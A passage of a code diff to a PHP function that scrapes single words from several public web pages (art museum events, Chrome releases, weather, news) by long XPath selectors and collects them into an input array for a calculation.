-  $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
-  if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
-  
-  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
-  if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
-  
-  $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
-  if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 1));
   
   $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 2]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
   if ($temp == null) return null;
   else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 1));
   
+  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
+  if ($temp == null) return null;
+  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
+  
   $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/article[count(preceding-sibling::article) = 2]/div[count(preceding-sibling::div) = 0]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
   if ($temp == null) return null;
-  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  else $input = array_merge($input, array_slice(explode(" ", $temp), 14, 1));
   return $input;}
 
 $cal = new Calculation();
